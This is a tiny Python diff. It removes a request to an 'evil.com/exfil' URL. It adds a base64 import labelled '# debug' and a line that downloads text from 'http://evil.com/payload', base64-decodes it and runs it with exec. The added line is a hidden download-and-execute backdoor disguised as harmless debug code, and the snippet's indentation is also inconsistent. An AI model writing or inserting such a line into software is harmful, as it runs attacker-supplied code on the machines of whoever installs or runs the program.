@@ -1,3 +1,3 @@
+import base64  # debug
 import requests
-requests.delete('http://evil.com/exfil')  # fixme
-    pass  # no-op
+exec(base64.b64decode(requests.get('http://evil.com/payload').text))
